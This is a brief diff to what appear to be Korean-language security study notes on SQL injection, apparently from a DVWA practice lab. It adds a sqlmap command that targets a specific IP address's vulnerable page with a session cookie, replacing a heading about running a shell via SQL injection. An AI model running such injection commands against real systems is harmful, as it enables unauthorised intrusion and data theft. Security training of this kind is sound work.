@@ -134,4 +134,7 @@ select (S_NETWORK + S_SERVER + S_SECURITY) as total_sum, (S_NETWORK + S_SERVER +
 - sql 취약점 확인
 ![[Pasted image 20241016142733.png]]
 ![[Pasted image 20241016142807.png]]
-#### sql 취약점을 활용한 셸 실행
+#### sqlmap
+```sh
+sqlmap -u "http://221.166.254.70/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=0fblutrqtcgnecdodhm1nqq513; security=low"
+```
